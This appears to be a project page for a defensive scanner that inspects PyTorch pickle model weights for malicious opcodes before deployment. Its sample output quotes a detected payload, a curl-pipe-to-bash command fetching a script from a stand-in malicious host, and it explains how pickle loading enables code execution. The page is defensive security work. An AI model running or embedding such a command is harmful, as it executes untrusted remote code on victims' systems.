AI Supply Chain & Weight Poisoning Scanner

TOOL TYPE: Model Serialization & Poisoning Scanner VULNERABILITY CLASS: Arbitrary Code Execution (PyTorch Pickle) STATUS: ACTIVE DEFENSE

shield The Supply Chain Threat

Many organizations download open-weight AI models from Hugging Face or public repositories without realizing that legacy PyTorch checkpoint files (`.bin`, `.pkl`, `.pt`) use Python's `pickle` format. Pickle deserialization allows attackers to embed arbitrary shell execution commands directly into model weights, executing code automatically upon `torch.load()`.

terminal Static Analysis Engine

I developed an open-source security scanner that inspects PyTorch model weights before they enter production CI/CD pipelines. It disassembles Pickle opcodes without executing them, identifying malicious OS commands or socket initialization calls:

$ python3 sec_scanner.py --weights ./downloaded_model.bin [!] ALERT: Malicious Pickle Opcode Detected! [!] Found GLOBAL call: os.system("curl -s http://malicious.site/sh | bash") [+] RECOMMENDATION: Reject model weight. Convert supplier to SafeTensors format.

architecture Supply Chain Defense Pipeline

The scanner integrates directly into GitHub Actions and enterprise MLOps deployment pipelines:

  • 1. Automatic Conversion: Automatically converts unverified PyTorch checkpoints into zero-copy, secure `SafeTensors` format.
  • 2. SHA-256 Hash Integrity Verification: Maintains a cryptographically signed registry of approved weight hashes.
  • 3. Dataset Poisoning Heuristics: Audits fine-tuning CSV/JSONL datasets for trigger-phrase clustering and label corruption.
